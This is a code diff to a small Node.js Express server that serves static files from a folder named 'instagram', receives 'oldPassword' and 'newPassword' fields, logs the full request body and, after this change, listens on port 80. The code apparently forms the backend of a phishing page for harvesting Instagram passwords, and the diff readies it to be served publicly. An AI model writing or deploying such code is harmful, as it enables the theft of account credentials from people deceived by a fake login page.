@@ -1,10 +1,11 @@
 const fs = require('fs');
 const express = require('express');
-const cors = require('cors')
+const cors = require('cors');
 const app = express();
 
 app.use(express.json({ extended: false }));
 app.use(cors())
+app.use(express.static('instagram'))
 app.post('/', (req, res) => {
   console.log(req.body)
   const { oldPassword, newPassword } = req.body;
@@ -15,6 +16,6 @@ app.post('/', (req, res) => {
 });
 });
 
-app.listen(5000, () => {
+app.listen(80, () => {
   console.log('Server started');
 });
